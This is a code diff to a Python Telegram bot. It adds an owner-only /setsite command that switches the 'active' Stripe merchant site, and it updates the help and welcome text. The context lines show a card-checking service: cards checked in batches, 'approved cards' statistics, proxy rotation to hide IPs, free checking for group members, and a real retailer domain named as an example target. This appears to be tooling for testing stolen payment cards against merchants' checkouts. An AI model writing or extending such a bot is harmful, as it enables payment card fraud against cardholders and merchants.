@@ -181,11 +181,8 @@ def check_free_user_access(message):
         markup = types.InlineKeyboardMarkup(row_width=1)
         join_btn = types.InlineKeyboardButton("✅ Join Our Group", url="https://t.me/UL_CHATV2")
         markup.add(join_btn)
-        
-        # ✅ Use custom welcome text
         with welcome_text_lock:
             msg = welcome_text
-        
         safe_send_message(message.chat.id, msg, reply_markup=markup)
         return False
     return True
@@ -872,9 +869,9 @@ Checking cards in 3-card batches...
 
 # ==================== BOT COMMANDS ====================
 
+# ==================== 🔥 NEW COMMAND 1: SET WELCOME TEXT ====================
 @bot.message_handler(commands=['setwelcome'])
 def set_welcome_command(message):
-    """Admin: Set custom welcome text"""
     if message.from_user.id not in OWNER_IDS:
         safe_send_message(message.chat.id, "❌ Only owner can use this command!")
         return
@@ -886,14 +883,9 @@ def set_welcome_command(message):
 <b>Example:</b>
 /setwelcome Welcome to my bot! Enjoy free checking!
 
-<b>To add new lines, use:</b>
-/setwelcome Line 1
-Line 2
-Line 3
-
 <b>To reset to default:</b>
 /setwelcome default"""
-        safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
+        safe_send_message(message.chat.id, msg)
         return
     
     new_text = parts[1].strip()
@@ -910,12 +902,46 @@ Line 3
 • Instant results
 
 ⬇️ Click the button below to join and start checking:"""
-            safe_send_message(message.chat.id, "✅ Welcome text reset to default!", reply_to_message_id=message.message_id)
+            safe_send_message(message.chat.id, "✅ Welcome text reset to default!")
         else:
             welcome_text = new_text
-            safe_send_message(message.chat.id, f"✅ Welcome text updated!\n\n{new_text}", reply_to_message_id=message.message_id)
+            safe_send_message(message.chat.id, f"✅ Welcome text updated!\n\n{new_text}")
 
-# ==================== REST OF THE BOT COMMANDS ====================
+# ==================== 🔥 NEW COMMAND 2: SET ACTIVE SITE ====================
+@bot.message_handler(commands=['setsite'])
+def set_site_command(message):
+    if message.from_user.id not in OWNER_IDS:
+        safe_send_message(message.chat.id, "❌ Only owner can use this command!")
+        return
+    
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        msg = """❌ Usage: /setsite <site_domain>
+
+<b>Example:</b>
+/setsite rosetone.co.uk
+/setsite example.com
+
+<b>Current Site:</b> <code>{}</code>""".format(stripe_sites[0] if stripe_sites else 'None')
+        safe_send_message(message.chat.id, msg)
+        return
+    
+    site = parts[1].strip().lower()
+    site = site.replace('http://', '').replace('https://', '')
+    
+    with sites_lock:
+        if site in stripe_sites:
+            stripe_sites.remove(site)
+            stripe_sites.insert(0, site)
+        else:
+            stripe_sites.insert(0, site)
+    
+    safe_send_message(
+        message.chat.id,
+        f"✅ <b>Active Site Updated!</b>\n\n<b>New Active Site:</b> <code>{site}</code>\n<b>Total Sites:</b> {len(stripe_sites)}"
+    )
+
+# ==================== START COMMAND ====================
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
@@ -2554,7 +2580,8 @@ def help_command(message):
 • /stats - Approved cards statistics
 • /site - Manage sites with buttons
 • /setgif - Set GIF for approved/welcome
-• /setwelcome - Set custom welcome text"""
+• /setwelcome - Set custom welcome text
+• /setsite - Set active site"""
     else:
         msg += """
 
@@ -2587,6 +2614,9 @@ def help_command(message):
 <b>📝 Welcome Text:</b>
 • /setwelcome <text> - Set custom welcome text (admin)
 • /setwelcome default - Reset to default
+
+<b>🌐 Active Site:</b>
+• /setsite <site> - Set active site (admin)
 
 <b>⚠️ Important:</b>
 • Bot supports 600+ users simultaneously
@@ -2648,6 +2678,7 @@ print(f"🌐 PROXY SYSTEM ADDED: Users can add proxies for IP rotation")
 print(f"🎬 GIF SYSTEM ADDED: Admin can set GIF for approved cards and welcome")
 print(f"📡 SITE MANAGEMENT ADDED: /site command with buttons")
 print(f"📝 WELCOME TEXT SYSTEM ADDED: Admin can change welcome text with /setwelcome")
+print(f"🌐 ACTIVE SITE COMMAND ADDED: Admin can change active site with /setsite")
 print(f"🔥 ALL YOUR ORIGINAL FEATURES PRESERVED 100%")
 
 bot.infinity_polling(timeout=30, long_polling_timeout=30)
